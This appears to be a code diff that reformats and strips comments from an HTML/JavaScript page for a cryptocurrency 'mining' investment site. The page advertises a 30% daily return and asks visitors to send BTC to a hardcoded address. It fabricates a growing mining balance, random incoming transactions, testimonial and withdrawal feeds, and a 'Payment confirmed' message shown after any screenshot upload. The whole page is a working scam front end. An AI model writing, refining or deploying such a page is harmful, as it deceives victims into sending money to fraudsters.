@@ -57,7 +57,6 @@ canvas{width:100%;height:140px;border-radius:8px;margin-top:10px;background:#0b0
   <button id="submitCodeBtn" class="hidden" onclick="verifyCode()">Submit</button>
   <button id="resendCodeBtn" class="hidden" onclick="sendCode()">Resend code</button>
 </div><div id="dashboard" class="hidden">
-  <!-- BTC Deposit -->
   <div class="card">
     <h2>BTC Deposit Address</h2>
     <div class="btc-box" id="btcAddress">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
@@ -65,7 +64,7 @@ canvas{width:100%;height:140px;border-radius:8px;margin-top:10px;background:#0b0
     <div style="text-align:center;margin-top:10px;">
       <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav">
     </div>
-  </div>  <!-- Mining Dashboard -->  <div class="card">
+  </div>  <div class="card">
     <h2>Mining Dashboard</h2>
     <p style="text-align:center;color:var(--accent);">Earn 30% daily return</p>
     <div class="btc" id="balance">0.00000000 BTC</div>
@@ -75,66 +74,52 @@ canvas{width:100%;height:140px;border-radius:8px;margin-top:10px;background:#0b0
       <div>Blocks: <span id="blocks">0</span></div>
       <div>Uptime: <span id="uptime">0h 0m</span></div>
     </div>
-  </div>  <!-- Recent Activity -->  <div class="card">
+  </div>  <div class="card">
     <h2>Recent Activity</h2>
     <div class="tx-container" id="txs"></div>
-  </div>  <!-- Investment Plans -->  <h2>Investment Plans</h2>
-  <div class="card" id="plansContainer"></div>  <!-- Live Testimonials -->  <div class="card" id="liveTestimonials">
+  </div>  <h2>Investment Plans</h2>
+  <div class="card" id="plansContainer"></div>  <div class="card" id="liveTestimonials">
     <h2>Live Testimonials</h2>
     <div id="testimonialFeed"></div>
-  </div>  <!-- Live Withdrawal Group -->  <div class="card hidden" id="withdrawals">
+  </div>  <div class="card hidden" id="withdrawals">
     <h2>Live Withdrawal Group</h2>
     <div id="feed"></div>
     <div id="stats" class="stats"></div>
-  </div>  <!-- Support Inbox -->  <div class="card hidden" id="support">
+  </div>  <div class="card hidden" id="support">
     <h2>Support Inbox</h2>
     <textarea id="supportMsg" placeholder="Write message..." style="width:100%;height:80px;"></textarea>
     <button onclick="sendSupport()">Send</button>
     <div id="supportReply"></div>
   </div>
 </div><div id="toast" class="toast"></div><script>
-// --- Top Menu ---
+// Top Menu
 menuBtn.onclick=()=>menu.style.display=menu.style.display==='block'?'none':'block';
-function showSection(id){document.querySelectorAll('.card').forEach(c=>{if(c.id==='loginCard') return;if(['withdrawals','support'].includes(c.id)) c.classList.add('hidden');});document.getElementById(id).classList.remove('hidden');menu.style.display='none';}
+function showSection(id){document.querySelectorAll('.card').forEach(c=>{if(c.id==='loginCard')return;if(['withdrawals','support'].includes(c.id))c.classList.add('hidden');});document.getElementById(id).classList.remove('hidden');menu.style.display='none';}
 function toggleTheme(){const t=document.body.dataset.theme==='dark'?'light':'dark';document.body.dataset.theme=t;localStorage.setItem('theme',t);}
-if(localStorage.getItem('theme')) document.body.dataset.theme=localStorage.getItem('theme');
+if(localStorage.getItem('theme'))document.body.dataset.theme=localStorage.getItem('theme');
 function logout(){localStorage.removeItem('verifiedUser');location.reload();}
 
-// --- Verification ---
+// Verification
 let generatedCode='',timer=null,timeLeft=60,userContact='';
 function sendCode(){userContact=document.getElementById('contactInput').value.trim();if(!userContact){alert('Enter email or phone');return;}generatedCode=Math.floor(100000+Math.random()*900000).toString();document.getElementById('generatedCode').innerText=generatedCode;document.getElementById('codeDisplay').classList.remove('hidden');document.getElementById('countdownDisplay').classList.remove('hidden');document.getElementById('codeInput').classList.remove('hidden');document.getElementById('submitCodeBtn').classList.remove('hidden');document.getElementById('resendCodeBtn').classList.remove('hidden');clearInterval(timer);timeLeft=60;document.getElementById('countdown').innerText=timeLeft;timer=setInterval(()=>{timeLeft--;document.getElementById('countdown').innerText=timeLeft;if(timeLeft<=0){clearInterval(timer);alert('Code expired. Resend.');}},1000);}
 function verifyCode(){if(document.getElementById('codeInput').value.trim()!==generatedCode){alert('Invalid code');return;}localStorage.setItem('verifiedUser',JSON.stringify({contact:userContact}));enterDashboard();}
 function enterDashboard(){document.getElementById('loginCard').style.display='none';document.getElementById('dashboard').classList.remove('hidden');document.getElementById('topbar').style.display='flex';document.getElementById('usernameDisplay').innerText=userContact;initializeDashboard();}
 if(localStorage.getItem('verifiedUser')){userContact=JSON.parse(localStorage.getItem('verifiedUser')).contact;enterDashboard();}
 
-// --- BTC copy ---
+// BTC copy
 function copyAddress(){navigator.clipboard.writeText(document.getElementById('btcAddress').innerText).then(()=>showToast('BTC address copied!'))}
-
-// --- Toast ---
 function showToast(msg){const t=document.getElementById('toast');t.innerText=msg;t.style.opacity=1;setTimeout(()=>{t.style.opacity=0;},3000);}
 
-// --- Dashboard Simulation ---
+// Initialize Dashboard
 function initializeDashboard(){
-  // Mining chart & balance
-  const canvas=document.getElementById('chart'),ctx=canvas.getContext('2d');
-  let points=[0],balance=0,blocks=0,minutes=0,rate=0.00000008,paused=false;
-  setInterval(()=>{
-    ctx.clearRect(0,0,canvas.width,canvas.height);
-    const w=canvas.width/50;
-    ctx.beginPath();
-    let lastY=canvas.height-points[0]*canvas.height/0.01;ctx.moveTo(0,lastY);
-    for(let i=1;i<points.length;i++){let y=canvas.height-points[i]*canvas.height/0.01;ctx.lineTo(i*w,y);}
-    ctx.strokeStyle='#f2a900';ctx.lineWidth=2;ctx.stroke();
-    const last=points[points.length-1]||0;points.push(last+rate);if(points.length>50) points.shift();
-  },500);
-  setInterval(()=>{if(!paused){balance+=rate;document.getElementById('balance').innerText=balance.toFixed(8)+' BTC';}}
-    ,1000);
+  // Mining chart
+  const canvas=document.getElementById('chart'),ctx=canvas.getContext('2d');let points=[0],balance=0,blocks=0,minutes=0,rate=0.00000008,paused=false;
+  setInterval(()=>{ctx.clearRect(0,0,canvas.width,canvas.height);const w=canvas.width/50;ctx.beginPath();let lastY=canvas.height-points[0]*canvas.height/0.01;ctx.moveTo(0,lastY);for(let i=1;i<points.length;i++){let y=canvas.height-points[i]*canvas.height/0.01;ctx.lineTo(i*w,y);}ctx.strokeStyle='#f2a900';ctx.lineWidth=2;ctx.stroke();const last=points[points.length-1]||0;points.push(last+rate);if(points.length>50)points.shift();},500);
+  setInterval(()=>{if(!paused){balance+=rate;document.getElementById('balance').innerText=balance.toFixed(8)+' BTC';}},1000);
   setInterval(()=>{blocks+=Math.floor(Math.random()*2);minutes++;document.getElementById('blocks').innerText=blocks;document.getElementById('uptime').innerText=Math.floor(minutes/60)+'h '+(minutes%60)+'m';},60000);
-  
+
   // Recent Activity
-  const txs=document.getElementById('txs');
-  function addTx(){const div=document.createElement('div');div.className='tx';const val=(Math.random()*0.0004+0.00002).toFixed(8);const status=Math.random()>0.5?'Completed':'Pending';div.innerHTML=`<span>+${val} BTC</span><span class="${status==='Completed'?'confirmed':'pending'}">${status}</span>`;txs.prepend(div);if(txs.children.length>500) txs.removeChild(txs.lastChild);}
-  setInterval(addTx,1500);
+  const txs=document.getElementById('txs');function addTx(){const div=document.createElement('div');div.className='tx';const val=(Math.random()*0.0004+0.00002).toFixed(8);const status=Math.random()>0.5?'Completed':'Pending';div.innerHTML=`<span>+${val} BTC</span><span class="${status==='Completed'?'confirmed':'pending'}">${status}</span>`;txs.prepend(div);if(txs.children.length>500)txs.removeChild(txs.lastChild);}setInterval(addTx,1500);
 
   // Investment Plans
   const plans=[
@@ -147,16 +132,9 @@ function initializeDashboard(){
   ];
   const container=document.getElementById('plansContainer');container.innerHTML='';
   plans.forEach((p,i)=>{
-    const div=document.createElement('div');div.className='plan';
-    div.innerHTML=`<h3>${p.name}</h3><p>Daily Profit: ${p.profit}</p><p>Min: $${p.min}</p><p>Max: ${p.max}</p><div class="pay-section" id="pay${i}"><p>Send BTC to:</p><div class="btc-box">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div><input type="file" id="screenshot${i}"><button onclick="confirmPayment(${i})">Paid</button><img id="preview${i}" class="screenshot-img" style="display:none"><p class="countdown" id="countdown${i}">Withdrawal available in 3d 0h 0m 0s</p></div><button onclick="showPay(${i})">Invest Now</button>`;
-    container.appendChild(div);
-  });
-
-  // Testimonials & Withdrawal Bot placeholder: populate with live messages, unique per device/email
-} 
-
+    const div=document.createElement('div');div.className='plan';div.innerHTML=`<h3>${p.name}</h3><p>Daily Profit: ${p.profit}</p><p>Min: $${p.min}</p><p>Max: ${p.max}</p><div class="pay-section" id="pay${i}"><p>Send BTC to:</p><div class="btc-box">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div><input type="file" id="screenshot${i}"><button onclick="confirmPayment(${i})">Paid</button><img id="preview${i}" class="screenshot-img" style="display:none"><p class="countdown" id="countdown${i}">Withdrawal available in 3d 0h 0m 0s</p></div><button onclick="showPay(${i})">Invest Now</button>`;container.appendChild(div);});
+}
 function showPay(i){document.getElementById('pay'+i).style.display='block';}
 function confirmPayment(i){const file=document.getElementById('screenshot'+i).files[0];if(!file){alert('Upload screenshot');return;}const reader=new FileReader();reader.onload=function(e){const img=document.getElementById('preview'+i);img.src=e.target.result;img.style.display='block';showToast('Payment confirmed! Withdrawal countdown started.');};reader.readAsDataURL(file);}
-
 </script></body>
-</html>
+    </html>
